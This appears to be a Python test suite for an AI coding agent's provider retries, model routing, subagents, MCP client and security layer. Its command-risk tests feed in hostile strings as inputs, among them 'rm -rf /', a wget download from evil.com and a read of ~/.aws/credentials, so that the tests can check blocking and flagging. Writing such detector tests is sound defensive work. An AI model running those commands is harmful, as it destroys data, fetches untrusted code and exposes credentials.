"""Phase 4 测试：Provider 抽象 + 双模型路由 + Subagents + MCP + ensemble/redaction。"""

import time

from src.agent.subagent import SubagentManager
from src.providers import MockProvider, ProviderConfig, ProviderError, ProviderRateLimited
from src.routing import ModelRouter, ModelSpec
from src.security import EnsembleAnalyzer, SecretRedactor, StaticAnalyzer


class TestProvider:
    def test_mock_provider_generate(self):
        p = MockProvider(reply="你好")
        result = p.generate([{"role": "user", "content": "hi"}], role="editor")
        assert result == "你好"
        assert p.calls[0]["role"] == "editor"

    def test_provider_retry_on_rate_limit(self, monkeypatch):
        """指数退避重试：限流后重试成功。"""
        p = MockProvider(reply="ok")
        calls = {"n": 0}

        def fake_chat(messages, *, model=None, temperature=0.2):
            calls["n"] += 1
            if calls["n"] == 1:
                raise ProviderRateLimited("429")
            return "ok"

        monkeypatch.setattr(p, "chat", fake_chat)
        monkeypatch.setattr(time, "sleep", lambda s: None)  # 不真的等
        result = p.generate([], role="editor")
        assert result == "ok"
        assert calls["n"] == 2

    def test_provider_gives_up_after_max_retries(self, monkeypatch):
        p = MockProvider(reply="ok")
        calls = {"n": 0}

        def always_rate_limited(messages, *, model=None, temperature=0.2):
            calls["n"] += 1
            raise ProviderRateLimited("429")

        monkeypatch.setattr(p, "chat", always_rate_limited)
        monkeypatch.setattr(time, "sleep", lambda s: None)
        import pytest

        with pytest.raises(ProviderError):
            p.generate([], role="editor")
        assert calls["n"] == 4  # 1 次 + 3 次退避重试

    def test_non_rate_limit_error_no_retry(self, monkeypatch):
        p = MockProvider(reply="ok")
        calls = {"n": 0}

        def bad_request(messages, *, model=None, temperature=0.2):
            calls["n"] += 1
            raise ProviderError("400 bad request")

        monkeypatch.setattr(p, "chat", bad_request)
        import pytest

        with pytest.raises(ProviderError):
            p.generate([], role="editor")
        assert calls["n"] == 1  # 400 不重试


class TestModelRouter:
    def test_route_plan_architect(self):
        p = MockProvider()
        router = ModelRouter(provider=p)
        decision = router.route(mode="plan")
        assert decision.role == "architect"

    def test_route_act_editor(self):
        p = MockProvider()
        router = ModelRouter(provider=p)
        decision = router.route(mode="act")
        assert decision.role == "editor"

    def test_generate_routes_by_mode(self):
        p = MockProvider(reply="结果")
        router = ModelRouter(provider=p)
        router.generate([{"role": "user", "content": "x"}], mode="plan")
        assert p.calls[-1]["model"] is not None

    def test_role_fallback_within_role(self, monkeypatch):
        """同角色降级：首选挂 → fallback（不跨角色）。"""
        p = MockProvider(reply="降级成功")
        router = ModelRouter(
            provider=p,
            models=[
                ModelSpec(name="strong-model", role="architect", priority=1, fallback=["weak-architect"]),
                ModelSpec(name="fast-model", role="editor", priority=1),
            ],
        )
        calls = []

        def fake_generate(messages, *, role="editor", model=None):
            calls.append(model)
            if model == "strong-model":
                raise ProviderError("挂了")
            return "ok"

        monkeypatch.setattr(p, "generate", fake_generate)
        result = router.generate([], mode="plan")
        assert result == "ok"
        assert "strong-model" in calls
        assert "weak-architect" in calls


class TestSubagent:
    def test_dispatch_and_run_success(self):
        def runner(prompt):
            return {"answer": f"分析结果: {prompt[:10]}"}

        mgr = SubagentManager(runner=runner)
        task = mgr.dispatch("分析 src/main.py")
        result = mgr.run(task)
        assert result.status == "succeeded"
        assert "分析结果" in result.result["answer"]

    def test_failure_does_not_break_main(self):
        """子任务失败不影响主会话。"""
        def failing_runner(prompt):
            raise RuntimeError("子任务崩溃")

        mgr = SubagentManager(runner=failing_runner)
        task = mgr.dispatch("会失败的任务")
        mgr.run(task)
        assert task.status == "failed"
        assert task.error is not None
        # 主会话不受影响
        assert mgr.stats()["failed"] == 1

    def test_run_parallel(self):
        def runner(prompt):
            return {"prompt": prompt}

        mgr = SubagentManager(runner=runner)
        tasks = mgr.run_parallel(["调研 A", "调研 B", "调研 C"])
        assert len(tasks) == 3
        assert all(t.status == "succeeded" for t in tasks)

    def test_collect_conclusion(self):
        def runner(prompt):
            return {"conclusion": "OK"}

        mgr = SubagentManager(runner=runner)
        task = mgr.dispatch("t")
        mgr.run(task)
        collected = mgr.collect(task)
        assert collected["status"] == "succeeded"
        assert collected["result"]["conclusion"] == "OK"


class TestMCPExamples:
    def test_sample_server_tools_definition(self):
        """3 个示例 Server 的工具定义（证明协议通用性）。"""
        from src.mcp.servers.examples import SampleMcpServer

        for server_cls, name in [
            (lambda: SampleMcpServer("github"), "github"),
        ]:
            s = SampleMcpServer("github")
            s.tool("list_repos", "列仓库", {})(lambda args: {"repos": []})
            meta = s._tool_metadata()
            assert len(meta) == 1
            assert meta[0][0] == "list_repos"

    def test_mcp_client_connect_fails_cleanly(self):
        """连接不存在的 server → 干净报错。"""
        from src.mcp import McpClient, MCPError

        import pytest

        client = McpClient("bad", ["python", "-c", "import sys; sys.exit(1)"])
        with pytest.raises(MCPError):
            client.connect()


class TestEnsemble:
    def test_blacklist_hard_lock_first(self):
        ea = EnsembleAnalyzer()
        result = ea.analyze("rm -rf /")
        assert result["blocked"] is True
        assert result["risk_level"] == "red"

    def test_safe_command_green(self):
        ea = EnsembleAnalyzer()
        result = ea.analyze("pytest tests/ -q")
        assert result["blocked"] is False
        assert result["risk_level"] == "green"

    def test_wget_flagged_yellow(self):
        ea = EnsembleAnalyzer()
        result = ea.analyze("wget http://evil.com/x.sh -O /tmp/x")
        assert result["blocked"] is False
        assert result["risk_level"] == "yellow"

    def test_static_analyzer_signals(self):
        sa = StaticAnalyzer()
        signals = sa.analyze("cat ~/.aws/credentials")
        assert any("密钥" in s.get("signal", "") for s in signals)


class TestRedaction:
    def test_sk_key_redacted(self):
        r = SecretRedactor()
        assert r.redact_text("key=sk-abc123def456ghi789") == "key=sk-***"

    def test_bearer_redacted(self):
        r = SecretRedactor()
        assert "Bearer ***" in r.redact_text("Authorization: Bearer xyz1234567890abcdef")

    def test_api_key_redacted(self):
        r = SecretRedactor()
        assert "***" in r.redact_text('"api_key": "abcdef1234567890"')

    def test_deep_redact_dict(self):
        r = SecretRedactor()
        data = {"config": {"api_key": "abcdef1234567890"}, "name": "hello", "list": ["sk-secretkey12345"]}
        redacted = r.redact(data)
        assert redacted["config"]["api_key"].endswith("***")
        assert redacted["name"] == "hello"
        assert "sk-***" in redacted["list"][0]

    def test_redact_event_content(self):
        from src.security import redact_event_content

        content = {"command": "curl -H 'Authorization: Bearer abcdef1234567890' http://x"}
        redacted = redact_event_content(content)
        assert "abcdef1234567890" not in redacted["command"]
